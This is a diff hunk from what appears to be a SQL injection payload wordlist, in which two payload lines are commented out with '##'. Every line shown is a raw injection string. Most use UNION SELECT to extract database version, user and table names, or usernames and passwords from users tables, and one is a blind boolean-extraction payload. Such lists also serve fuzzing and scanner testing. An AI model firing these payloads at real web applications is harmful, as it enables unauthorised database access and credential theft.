@@ -10614,7 +10614,7 @@
 -573 union select 1,2,3,4,concat(nikname,0x20,nikpass,0x20,admin_ok,,0x20,admin_nikkazakhemailyes),6,7,8,9,10 FROM nik--
 -573 union select 1,2,3,table_name,5 from INFORMATION_SCHEMA.TABLES limit 23,1/*
 -573 union select 1,2,3,version(),password,6,7,user,char(58),10 from users/*
-57 /!*40000 and 0 */
+## 57 /!*40000 and 0 */
 -5746' union select 1,2,3,4,5,version(),7,8,9,0,1,2,3,4,5,6,17/*
 -574 union select 1,2,3,4,5,version(),7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86/*
 575 and 1=0 =null Union Select  1,concat_ws(0x3a,user(),database(),version()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37
@@ -13770,7 +13770,7 @@ aaa' union select 1/*
 aaa' union select NULL,NULL,version(),database(),user(),NULL,NULL,NULL,NULL,NULL,1,2,3,4,5,6,7,8,9,20,1 -- 
 a%') and 1=@@version--
 aa') union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/*
-actu.php?id_actu=-1 union select 1,2,3,4,5,concat_ws(0x3a,version(),database(),user()),7,8,9,10/*
+## actu.php?id_actu=-1 union select 1,2,3,4,5,concat_ws(0x3a,version(),database(),user()),7,8,9,10/*
 (added_on*if(ascii(substring((select version() from information_schema.tables limit 1,1),1,1))=53,1,-1))
 -adig' union select 1,2,3,4,concat_ws(0x3a,database(),user(),version()),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24 -- 
 alpine_boots where 1=2 union select version(),2,3,4,5,6,7,8,9,0,1,2,1,4,5,6,7,8,9,0,1,2,3,4,5,6,7-- 
